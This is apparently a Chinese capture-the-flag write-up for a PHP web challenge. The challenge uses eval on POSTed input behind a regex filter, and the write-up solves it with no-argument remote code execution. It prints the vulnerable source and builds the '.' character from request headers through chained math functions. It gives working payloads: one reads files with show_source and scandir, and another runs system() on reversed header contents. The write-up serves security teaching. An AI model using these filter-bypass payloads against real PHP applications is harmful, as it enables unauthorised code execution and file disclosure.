# Mercy-code

> 分类：Web

## 题目描述

无参数 RCE。PHP 代码过滤了危险函数和关键字，要求构造无参函数调用读取 flag（参考 bytectf boring code）。

## 考察知识点

- PHP 无参数 RCE
- 数学函数构造字符（`.`
- `apache_request_headers()` / `getallheaders()`

## 解法

源码：

```php
<?php
highlight_file(__FILE__);
if ($_POST['cmd']) {
    $cmd = $_POST['cmd'];
    if (';' === preg_replace('/[a-z_]+\((?R)?\)/', '', $cmd)) {
        if (preg_match('/file|if|localeconv|phpversion|sqrt|et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log|var_dump|pos|current|array|time|se|ord/i', $cmd)) {
            die('What are you thinking?');
        } else {
            eval($cmd);
        }
    } else {
        die('Please calm down');
    }
}
```

无参 RCE。核心是构造 `.`（chr(46)），可通过 `end(apache_request_headers())` 得到 80（通过请求头），再用三角函数运算得到 46：

```php
ceil(sinh(cosh(tan(ceil(cosh(sin(tan(end(apache_request_headers()))))))))) // 46
```

最终 payload：

```
cmd=show_source(end(scandir(chr(ceil(sinh(cosh(tan(ceil(cosh(sin(tan(end(apache_request_headers())))))))))))));
```

（另一解法：`cmd=system(strrev(implode(apache_request_headers())))`）

## 参考答案

（flag 通过无参 RCE 的 show_source 读取）

## 来源

- 作者：se1zer | https://www.cnblogs.com/seizer/p/17036300.html
- 作者：V3geD4g | https://blog.csdn.net/xczzhf/article/details/124652308
- 作者：shu天 | https://cn-sec.com/archives/1416716.html
